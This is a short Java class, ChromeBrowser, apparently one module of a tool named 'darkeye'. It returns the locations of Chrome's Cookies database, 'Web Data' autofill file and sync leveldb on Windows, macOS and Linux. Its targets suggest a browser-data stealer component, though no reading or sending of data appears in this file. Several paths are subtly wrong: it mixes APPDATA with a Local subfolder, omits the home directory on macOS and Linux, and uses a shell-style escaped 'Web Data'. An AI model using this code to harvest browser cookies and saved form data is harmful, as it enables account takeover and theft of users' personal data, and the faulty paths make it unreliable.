package org.spray.darkeye.module.browsers;

import org.spray.darkeye.module.BrowserModule;
import org.spray.darkeye.utils.OSTools;

public class ChromeBrowser extends BrowserModule {

	public ChromeBrowser() {
		super("Chrome");
	}

	@Override
	public String getCookie() {
		return getFolder() + "/Cookies";
	}

	@Override
	public String getAutoFill() {
		String data = OSTools.isOSLinux() ? "Web\\ Data" : "Web Data";
		return getFolder() + "/" + data;
	}
	
	@Override
	public String getLevelDB() {
		return getFolder() + "/Sync Data/leveldb";
	}

	private String getFolder() {
		String folder = "";
		switch (OSTools.getType()) {
		case Windows:
			folder = System.getenv("APPDATA") + "/Local/Google/Chrome/User Data/Default";
			break;
		case MacOS:
			folder = "/Library/Application Support/Google/Chrome/Default";
			break;
		case Linux:
			folder = "/.config/google-chrome/Default";
			break;
		default:
			break;
		}
		return folder;
	}

}
